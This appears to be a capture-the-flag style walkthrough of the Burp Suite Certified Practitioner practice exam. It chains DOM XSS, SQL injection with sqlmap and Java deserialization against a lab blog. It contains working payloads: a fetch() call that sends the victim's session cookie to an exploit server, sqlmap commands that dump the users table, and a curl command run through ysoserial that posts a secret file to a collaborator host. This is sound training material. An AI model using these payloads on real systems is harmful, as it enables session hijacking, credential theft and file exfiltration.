@@ -1,0 +1,142 @@
+Okay, here is the walkthrough formatted in Markdown:
+
+# BSCP Practice Exam Walkthrough
+
+This document details the step-by-step process used to successfully complete the PortSwigger Burp Suite Certified Practitioner (BSCP) practice exam, as demonstrated in the provided video. The goal is to chain vulnerabilities to gain initial access, escalate privileges, and finally read a sensitive file from the server's filesystem.
+
+## Tools Used:
+
+*   **Burp Suite Professional:** Essential for proxying, repeating requests, and using extensions.
+*   **Web Browser:** (Firefox used in the video) For interacting with the application.
+*   **`sqlmap`:** Automated SQL injection detection and exploitation tool.
+*   **`ysoserial`:** Tool for generating Java deserialization payloads.
+*   **`Java Deserialization Scanner`** (Burp Extension): For detecting and exploiting Java deserialization vulnerabilities.
+*   **Base64 Decode/Encode Tools:** (Online or command-line) For handling Base64 data.
+*   **Terminal/Command Line:** For running `sqlmap` and potentially `ysoserial`/other commands.
+
+## Target:
+
+*   1 Web Application (Blog)
+
+## Time Limit:
+
+*   2 Hours
+
+## Objectives (3 Stages):
+
+1.  Gain access to any user account (low-privileged, typically `carlos`).
+2.  Escalate privileges to the `administrator` account (access `/admin` panel or compromise the account).
+3.  Use the admin interface/privileges to read `/home/carlos/secret` and submit its contents.
+
+## Key Information Provided:
+
+*   **Usernames:** `administrator` (always), `carlos` (usually the low-priv target).
+*   **Active User:** Simulates a user visiting the homepage every 15 seconds and clicking email links (relevant for reflected XSS).
+*   **Exploit Server:** Available to deliver reflected exploits.
+*   **Wordlists:** `auth-lab-usernames` and `auth-lab-passwords` provided if brute-forcing/enumeration is needed.
+*   **No Guessing:** Folder, file, or parameter names never need to be guessed/brute-forced.
+*   **XSS Context:** Victim browser is always Chromium.
+*   **Ignored Cookies:** `_lab` and `_lab_analytics` are irrelevant.
+
+## Walkthrough Steps:
+
+### Stage 1: Access Low-Privileged User (`carlos`)
+
+#### Initial Reconnaissance:
+
+*   Accessed the target blog application.
+*   Tested the search functionality. Observed that searching for standard terms (`test`) worked, but searching for a double quote (`"`) returned zero results, unlike a random string (`asdf`) which also returned zero but behaved normally. This inconsistent behavior for the double quote suggested special handling or a potential vulnerability point.
+
+#### Vulnerability Discovery (DOM XSS):
+
+*   Viewed the page source (`Ctrl+U`). Identified a JavaScript file (`/resources/js/searchResults.js`).
+*   Analyzed `searchResults.js`: Found it makes an asynchronous `GET` request to a path like `/search-res` appended with the current URL's query string (`window.location.search`).
+*   **Crucially**, the script uses `eval('var searchResultsObj = ' + this.responseText);` to parse the response. This is a dangerous sink.
+*   Used Burp Repeater to examine the `/search-res` endpoint. Sending `GET /search-res?search=Test` returned JSON: `{"results":[], "searchTerm":"Test"}`.
+*   Confirmed the `searchTerm` value from the JSON response is directly concatenated into the `eval()` string without proper sanitization. Injecting characters like `"` would break the JSON structure within the `eval()` call.
+
+#### Exploitation (DOM XSS -> Cookie Theft):
+
+*   **Goal:** Steal the session cookie (verified it was not `HttpOnly`).
+*   **Initial Payload:** Crafted a payload to break out of the JSON string context and execute JavaScript: `"%22%2C%22results%22%3A%5B%5D%7D%3Balert(1)%2F%2F"`. The `"` closes the `searchTerm` string, `alert(1)` executes, `{}` provides a valid object for the assignment `searchResultsObj = {}`, and `//` comments out the remaining invalid JSON syntax. Tested this directly in the search bar – successful `alert(1)` popup confirmed DOM XSS.
+*   **Cookie Exfiltration Payload:** Attempted `"-alert(document['cookie'])}//"`. This triggered a pop-up of my session.
+*   **Filter Bypass (Base64):** Constructed the JavaScript to fetch the cookie and send it to the exploit server: `fetch("https://EXPLOIT_SERVER_URL/?c=' + btoa(document['cookie']))`. Base64 encoded this entire JavaScript string.
+*   **Final XSS Payload:** Created the payload to decode and execute the Base64'd JS: `"-eval(atob('BASE64_ENCODED_JAVASCRIPT'))}//"`. URL-encoded this final payload.
+*   **Delivery:** Used the Burp Exploit Server. Created a simple HTML page containing a Meta Refresh Tag. This tag instructs the browser to immediately redirect to the constructed vulnerable URL. Pasted this HTML redirection code into the Body section of the Burp Exploit Server. Clicked "Deliver exploit to victim".
+*   **Cookie Retrieval:** Checked the Exploit Server's Access Log. Found an incoming request to `/` with a query parameter `c` containing the Base64 encoded session cookie of the victim (`carlos`).
+*   **Impersonation:** Copied the Base64 cookie value, decoded it, and replaced the current browser session cookie with the victim's (`carlos'`) cookie. Refreshed the page.
+
+#### Outcome:
+
+*   Successfully logged in as `carlos`. Exam status updated to 1/3 complete.
+
+### Stage 2: Escalate Privileges to Administrator
+
+#### Reconnaissance (as `carlos`):
+
+*   Explored the application features available to `carlos`.
+*   Navigated to "My Account" - no obvious vulnerabilities found.
+*   Navigated to "Advanced Search". Used the option to search for a product, Noticed new filtering options (`organize_by`, "By author").
+
+#### Vulnerability Discovery (SQL Injection):
+
+*   Tested the "Advanced Search" parameters. Appending a single quote (`'`) to the `organize_by` parameter in the URL (`...&organize_by=DATE'`) resulted in an SQL error page (`"ERROR: unterminated string literal..."`). This confirmed SQL injection in the sort-by parameter.
+
+#### Exploitation (SQL Injection with `sqlmap`):
+
+*   Copied the vulnerable URL from the browser tab.
+*   Ran `sqlmap`, specifying the vulnerable parameter and batch mode:
+    ```bash
+    sqlmap -u "VULNERABLE_URL" --dbms=PostgreSQL --cookie="..." -p organize_by --batch --level=5 --risk=3 --random-agent
+    ```
+*   `sqlmap` identified the backend DBMS as PostgreSQL and confirmed Error-Based and Stacked Query (via Time-Based) SQL injection vulnerabilities.
+*   Dumped database names: Added `--dbs`. Identified `public` as the likely application database.
+*   Dumped table names from `public`: Added `-D public --tables`. Identified `users`, `posts`, `comments`.
+*   Dumped `users` table content: Added `-T users --dump`.
+
+#### Outcome:
+
+*   Successfully retrieved the username and password for the `administrator` account from the `users` table. Logged out as `carlos`, then logged in as `administrator` using the retrieved credentials. Exam status updated to 2/3 complete.
+
+### Stage 3: Read Secret File (`/home/carlos/secret`)
+
+#### Reconnaissance (as `administrator`):
+
+*   Accessed the Admin Panel (`/admin-panel`). Observed functionality to delete users.
+*   Noticed the presence of an `admin-prefs` cookie set for the administrator session.
+
+#### Vulnerability Discovery (Java Deserialization):
+
+*   Examined the `admin-prefs` cookie value.
+*   Base64 decoded the cookie value.
+*   Used command-line tools (`file`, `xxd`) on the decoded binary data. Identified it as Gzip compressed data (`file` output) containing a Java serialized object magic number (`aced 0005` in `xxd` output). This confirmed a Java Deserialization vulnerability vector via the cookie.
+
+#### Exploitation (Java Deserialization with `ysoserial` & Burp Extension):
+
+*   Used the "**Java Deserialization Scanner**" Burp extension.
+*   Sent a request made as administrator (e.g., accessing the admin panel) to the plugin's "Manual testing" tab.
+*   Highlighted the `admin-prefs` cookie value and set it as the insertion point.
+*   Configured the necessary encoding/compression steps in reverse order for the plugin to apply before sending the payload:
+    1.  Compress using Gzip
+    2.  Encode using Base64
+    3.  Encode using URL encoding
+*   Configured the path to the `ysoserial.jar` file in the plugin's settings.
+*   Ran the "DNS (vuln libraries)" scan from the plugin's "Manual testing" tab. The scan identified Apache Commons Collections 3 (payloads 3 and 4) as potentially vulnerable gadgets.
+*   Switched to the plugin's "Exploiting" tab. Selected the `CommonsCollections7` gadget.
+*   Crafted the command to be executed on the server: `'curl https://BURP_COLLABORATOR_CLIENT_URL -d @/home/carlos/secret'`. This command reads the target file and sends its contents via a `POST` request to the Burp Collaborator instance.
+*   Clicked "Attack". The plugin generated the `ysoserial` payload, applied the Gzip/Base64/URL encoding, replaced the `admin-prefs` cookie value, and sent the request.
+*   Monitored Burp Collaborator. Received an HTTP `POST` request containing the contents of `/home/carlos/secret` in its body (e.g., `solution=ACTUAL_SECRET_VALUE`).
+
+#### Outcome:
+
+*   Copied the secret value from the Burp Collaborator logs. Pasted it into the "Submit solution" prompt on the main application page and submitted. The application confirmed the solution was correct. Exam status updated to 3/3 complete.
+
+## Conclusion:
+
+The practice exam was successfully completed by chaining three distinct vulnerabilities:
+
+*   **DOM-Based XSS:** Exploited via an unsanitized `eval()` sink handling JSON data, allowing session cookie theft.
+*   **Error-Based SQL Injection:** Found in a sorting parameter accessible after initial login, allowing `administrator` credential extraction.
+*   **Java Deserialization:** Exploited via a Gzip/Base64/URL-encoded serialized object in an administrative cookie, leading to Remote Code Execution (RCE) used to read the final secret file.
+
+This walkthrough demonstrates a realistic vulnerability chain requiring careful reconnaissance, understanding of both client-side and server-side vulnerabilities, and proficient use of Burp Suite and related tools like `sqlmap` and `ysoserial`.
